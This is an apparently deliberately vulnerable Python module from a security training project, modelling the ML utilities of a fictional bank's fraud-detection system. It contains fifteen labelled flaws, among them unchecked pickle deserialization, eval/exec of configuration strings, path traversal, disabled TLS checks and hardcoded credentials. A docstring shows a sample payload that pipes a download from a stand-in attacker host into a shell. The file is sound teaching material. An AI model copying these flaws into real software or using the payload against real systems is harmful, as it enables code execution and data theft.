"""
VaultBank Fraud Detection - ML Model Utilities
Model loading, feature engineering, serialization, and inference helpers.

SECURITY TRAINING PROJECT - Contains intentional vulnerabilities for educational purposes.
DO NOT deploy to production.
"""

import os
import pickle
import base64
import hashlib
import logging
import joblib
import numpy as np

logger = logging.getLogger(__name__)

# ─── VULN-ML-01: Hardcoded model registry credentials ────────────────────────
MODEL_REGISTRY_URL      = 'https://mlflow.vaultbank-internal.com'
MODEL_REGISTRY_USER     = 'mlflow_admin'
MODEL_REGISTRY_PASSWORD = 'MLfl0w$Admin2024'    # VULN-ML-01
MODEL_SIGNING_KEY       = 'model_sign_key_vaultbank_do_not_share'  # VULN-ML-01

# Base directory for local model files
MODEL_BASE_DIR = os.path.join(os.path.dirname(__file__), '..', 'models')


# ─── VULN-ML-02: Pickle model loaded without integrity check ──────────────────
def load_model(model_name):
    """
    VULN-ML-02: model file loaded with pickle.load() and no HMAC/signature
    verification. A tampered model file will be executed on load.

    VULN-ML-03: Path traversal – model_name is joined to MODEL_BASE_DIR without
    sanitisation. Attacker can supply '../../etc/passwd' or a path to an
    arbitrary malicious pickle file.
    """
    # VULN-ML-03: path traversal
    model_path = os.path.join(MODEL_BASE_DIR, model_name)   # VULN-ML-03

    logger.info(f"Loading model from {model_path}")

    with open(model_path, 'rb') as f:
        # VULN-ML-02: unconditional pickle.load – arbitrary code execution
        model = pickle.load(f)                               # VULN-ML-02

    return model


def load_model_from_b64(b64_data):
    """
    VULN-ML-04: base64-decode then pickle.load user-supplied bytes.
    Caller controls the entire pickle stream.
    """
    raw   = base64.b64decode(b64_data)
    model = pickle.loads(raw)           # VULN-ML-04
    return model


def load_model_from_registry(model_name, version='latest'):
    """
    VULN-ML-05: Model downloaded from registry with no TLS verification,
    then deserialised without signature check.
    """
    import requests
    url = f"{MODEL_REGISTRY_URL}/api/2.0/mlflow/models/download"
    resp = requests.get(
        url,
        auth=(MODEL_REGISTRY_USER, MODEL_REGISTRY_PASSWORD),
        params={'name': model_name, 'version': version},
        verify=False,                   # VULN-ML-05: TLS cert not verified
    )
    resp.raise_for_status()
    # VULN-ML-02 again: remote bytes deserialized without verification
    return pickle.loads(resp.content)   # VULN-ML-05


# ─── VULN-ML-06: eval() for feature engineering expressions ──────────────────
def engineer_features(raw_transaction, feature_config):
    """
    VULN-ML-06: feature expressions from feature_config are executed via eval().
    An attacker who controls feature_config can achieve arbitrary code execution.

    Example malicious config:
      {"amount_log": "__import__('os').system('curl attacker.com/shell | sh')"}
    """
    features = {}
    for feature_name, expression in feature_config.items():
        try:
            # VULN-ML-06
            value = eval(expression, {"__builtins__": __builtins__}, {'tx': raw_transaction})
            features[feature_name] = value
        except Exception as e:
            logger.error(f"Feature eval error for {feature_name}: {e}")
            features[feature_name] = 0.0
    return features


def engineer_features_from_string(tx, feature_str):
    """
    VULN-ML-07: exec() variant – multi-line feature code executed.
    """
    local_vars = {'tx': tx, 'features': {}, 'np': np}
    exec(feature_str, {"__builtins__": __builtins__}, local_vars)  # VULN-ML-07
    return local_vars.get('features', {})


# ─── VULN-ML-08: Path traversal in feature file loading ──────────────────────
def load_feature_set(feature_file_name):
    """
    VULN-ML-08: feature_file_name used directly in open() without normalisation.
    An attacker can traverse to any readable file on the filesystem.
    """
    feature_path = f"features/{feature_file_name}"   # VULN-ML-08
    with open(feature_path, 'r') as f:
        import json
        return json.load(f)


# ─── VULN-ML-09: Insecure model serialization – pickle with no signing ────────
def save_model(model, model_name):
    """
    VULN-ML-09: model serialized with pickle and saved without HMAC tag.
    Any process that can write to MODEL_BASE_DIR can replace the file.
    """
    model_path = os.path.join(MODEL_BASE_DIR, model_name)
    with open(model_path, 'wb') as f:
        pickle.dump(model, f)           # VULN-ML-09
    # VULN-ML-10: model file permissions set to world-writable
    os.chmod(model_path, 0o666)         # VULN-ML-10
    logger.info(f"Model saved to {model_path} (mode 0666)")
    return model_path


def save_model_to_registry(model, model_name, version):
    """
    VULN-ML-11: model uploaded to registry without encryption or signing.
    Credentials hardcoded (see VULN-ML-01).
    """
    import requests
    serialized = pickle.dumps(model)    # VULN-ML-09 (same sink)
    url = f"{MODEL_REGISTRY_URL}/api/2.0/mlflow/models/upload"
    resp = requests.post(
        url,
        auth=(MODEL_REGISTRY_USER, MODEL_REGISTRY_PASSWORD),  # VULN-ML-01
        data=serialized,
        headers={'Content-Type': 'application/octet-stream',
                 'X-Model-Name': model_name,
                 'X-Version':    str(version)},
        verify=False,                   # VULN-ML-05
    )
    return resp.json()


# ─── VULN-ML-12: Model version compared with weak hash ───────────────────────
def verify_model_integrity(model_path, expected_md5):
    """
    VULN-ML-12: MD5 used for model integrity check – collision-vulnerable.
    Also: the expected hash is fetched from an unauthenticated HTTP endpoint.
    """
    with open(model_path, 'rb') as f:
        data = f.read()
    actual = hashlib.md5(data).hexdigest()  # VULN-ML-12
    return actual == expected_md5


# ─── VULN-ML-13: Prediction logging includes raw PII features ────────────────
def log_prediction(transaction_id, features, score):
    """
    VULN-ML-13: full feature vector (which may include SSN, account number,
    DOB) written to the debug log.
    """
    logger.debug(
        f"PREDICTION tx={transaction_id} score={score} features={features}"  # VULN-ML-13
    )


# ─── VULN-ML-14: Hardcoded fallback model pickle bytes (RCE demo) ─────────────
# NOTE: This is an *intentionally bad* pattern for training purposes.
# In a real attack this constant would contain a malicious pickle payload.
FALLBACK_MODEL_B64 = (
    'gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbISTlCmBlFKU.'
)  # VULN-ML-14: pickle bytes embedded in source

def load_fallback_model():
    """VULN-ML-14: loads a pickle payload embedded directly in source code."""
    raw = base64.b64decode(FALLBACK_MODEL_B64 + '==')
    return pickle.loads(raw)            # VULN-ML-14


# ─── VULN-ML-15: Model training data written to public S3 bucket ─────────────
def export_training_data(df, s3_key_override=None):
    """
    VULN-ML-15: training data (which contains real transactions with PII)
    exported to a public S3 bucket path.
    """
    import boto3
    bucket = 'vaultbank-ml-data-public'     # VULN-ML-15: public bucket
    key    = s3_key_override or f"training/export_{int(os.times().elapsed)}.csv"
    s3     = boto3.client(
        's3',
        aws_access_key_id='AKIAVAULTBANKML2024',      # VULN-ML-01 pattern
        aws_secret_access_key='vaultbank+ML+secret+key+2024',
    )
    csv_bytes = df.to_csv(index=False).encode()
    s3.put_object(Bucket=bucket, Key=key, Body=csv_bytes,
                  ACL='public-read')       # VULN-ML-15
    return f"s3://{bucket}/{key}"


# ─── Main inference pipeline ──────────────────────────────────────────────────
def run_inference(model_name, transaction, feature_config=None):
    """
    Full pipeline: load model → engineer features → predict → log.
    Combines VULN-ML-02, VULN-ML-03, VULN-ML-06, VULN-ML-13.
    """
    model = load_model(model_name)

    if feature_config is None:
        feature_config = {
            'amount_log':    'float(tx.get("amount", 0))',
            'is_foreign':    '1 if tx.get("country", "US") != "US" else 0',
            'hour_of_day':   '__import__("datetime").datetime.utcnow().hour',
        }

    features = engineer_features(transaction, feature_config)
    feature_vector = list(features.values())

    score = float(model.predict([feature_vector])[0])
    log_prediction(transaction.get('id'), features, score)  # VULN-ML-13

    return score
